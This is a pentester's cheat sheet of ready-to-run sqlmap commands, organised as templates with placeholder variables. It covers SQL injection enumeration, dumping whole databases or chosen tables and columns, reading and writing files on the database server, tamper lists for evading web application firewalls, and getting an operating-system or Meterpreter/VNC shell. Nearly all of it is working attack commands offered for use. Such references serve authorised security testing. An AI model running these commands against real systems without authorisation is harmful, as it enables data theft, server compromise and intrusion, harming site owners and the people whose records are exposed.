# Sqlmap

<!-- cheat
export sqlmap
var sqlmap_templates = printf '%s\n' '# no im scared...' '--risk=3 --level=5 # yes, i dont care' --- --header 'Scan everything?'
var sqlmap_shell_templates = printf '%s\n' '--os-pwn # Prompt for an OOB shell, Meterpreter or VNC' '--os-shell # Prompt for an interactive operating system shell' --- --header 'Sqlmap shell template'
-->

## sqlmap - Enumeration

### Scan from request.txt

Scan Sqlmap from request.txt.

Run sqlmap against a captured Burp/ZAP request file. Easiest way to keep auth headers and POST bodies intact.

```sh title:"Sqlmap Scan from Request.txt"
sqlmap -r $file $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
import files
-->

### Check DB privileges

Check DB privileges with Sqlmap.

Check the DB user's privileges. Run before attempting --os-shell or --file-read.

```sh title:"Sqlmap Check DB Privileges"
sqlmap -r $file $sqlmap_templates --batch --privileges
```
<!-- cheat
import sqlmap
import files
-->

### List databases

List databases with Sqlmap.

Enumerate databases on the backend. Step 1 of data extraction.

```sh title:"Sqlmap List Databases"
sqlmap -r $file $sqlmap_templates --batch --dbs
```
<!-- cheat
import sqlmap
import files
-->

### List tables

List tables with Sqlmap.

Enumerate tables in a specific database.

```sh title:"Sqlmap List Tables"
sqlmap -r $file $sqlmap_templates --batch -D $db --tables
```
<!-- cheat
import sqlmap
import files
var db
-->

### List columns

List columns with Sqlmap.

Enumerate columns in a specific table.

```sh title:"Sqlmap List Columns"
sqlmap -r $file $sqlmap_templates --batch -D $db -T $table --columns
```
<!-- cheat
import sqlmap
import files
var db
var table
-->

### GET URL scan

Get URL scan with Sqlmap.

Run sqlmap against a URL directly.

```sh title:"Sqlmap Get URL Scan"
sqlmap -u "$url" $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
var url
-->

### POST data scan

Scan POST data scan with Sqlmap.

Run sqlmap against a URL with POST data.

```sh title:"Sqlmap Scan POST Data Scan"
sqlmap -u "$url" --data="$params" $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
var url
var params
-->

### Cookie scan

Scan cookie scan with Sqlmap.

Run sqlmap with a supplied Cookie header.

```sh title:"Sqlmap Scan Cookie Scan"
sqlmap -u "$url" --cookie="$cookie" $sqlmap_templates --batch
```
<!-- cheat
import sqlmap
var url
var cookie
-->

## sqlmap - Extraction

### Dump one table

Dump one table with Sqlmap.

Dump a single named table. Faster than --dump on full DBs and easier to review.

```sh title:"Sqlmap Dump One Table"
sqlmap -r $file $sqlmap_templates --batch -D $db -T $table --dump
```
<!-- cheat
import sqlmap
var file
var db
var table
-->

### Dump columns

Dump columns with Sqlmap.

Dump specific columns from a table.

```sh title:"Sqlmap Dump Columns"
sqlmap -r $file $sqlmap_templates --batch -D $db -T $table -C "$columns" --dump
```
<!-- cheat
import sqlmap
var file
var db
var table
var columns
-->

### Dump entire DB

Dump entire DB with Sqlmap.

Dump every table in the named database. Watch size.

```sh title:"Sqlmap Dump Entire DB"
sqlmap -r $file $sqlmap_templates --batch -D $db --dump
```
<!-- cheat
import sqlmap
var file
var db
-->

### Read file from server

Read file from server with Sqlmap.

Read a file from the database server filesystem via SQL primitives. Check --privileges first; FILE/READ rights required.

```sh title:"Sqlmap Read File from Server"
sqlmap -r req.txt --batch $sqlmap_templates --file-read=$file_path
```
<!-- cheat
import sqlmap
var file_path
-->

### Write file to server

Write file to server with Sqlmap.

Write a local file to the database server filesystem. Check privileges first.

```sh title:"Sqlmap Write File to Server"
sqlmap -r $file --batch $sqlmap_templates --file-write="$local_file" --file-dest="$remote_path"
```
<!-- cheat
import sqlmap
var file
var local_file
var remote_path
-->

## sqlmap - Tamper

### Generic tamper list

List generic tamper list with Sqlmap.

Run with a broad generic tamper list.

```sh title:"Sqlmap List Generic Tamper List"
sqlmap -u "$url" $sqlmap_templates --batch --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
<!-- cheat
import sqlmap
var url
-->

### MySQL tamper list

List MySQL tamper list with Sqlmap.

Run with a MySQL-focused tamper list.

```sh title:"Sqlmap List MySQL Tamper List"
sqlmap -u "$url" $sqlmap_templates --batch --dbms=MYSQL --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
<!-- cheat
import sqlmap
var url
-->

### MSSQL tamper list

List MSSQL tamper list with Sqlmap.

Run with an MSSQL-focused tamper list.

```sh title:"Sqlmap List MSSQL Tamper List"
sqlmap -u "$url" $sqlmap_templates --batch --dbms=MSSQL --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
<!-- cheat
import sqlmap
var url
-->

## sqlmap - Shell

### Get shell

Get shell with Sqlmap.

Try to land an OS shell or OOB shell via the SQL service account. Loud and only works on permissive DB users.

```sh title:"Sqlmap Get Shell"
sqlmap -r $file $sqlmap_templates --batch $sqlmap_shell_templates 
```
<!-- cheat
import sqlmap
var file
-->
